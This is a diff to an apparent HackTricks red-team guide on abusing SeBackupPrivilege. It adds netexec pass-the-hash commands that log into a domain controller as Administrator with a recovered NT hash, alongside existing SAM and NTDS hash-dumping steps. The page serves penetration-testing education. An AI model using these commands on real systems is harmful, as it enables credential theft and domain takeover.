@@ -141,6 +141,16 @@ reg save HKLM\SAM SAM.SAV
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 
+5. Post-extraction: Pass-the-Hash to DA
+
+```bash
+# Use the recovered Administrator NT hash to authenticate without the cleartext password
+netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
+
+# Or execute via SMB using an exec method
+netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
+```
+
 #### Using wbadmin.exe
 
 1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
@@ -313,9 +323,7 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
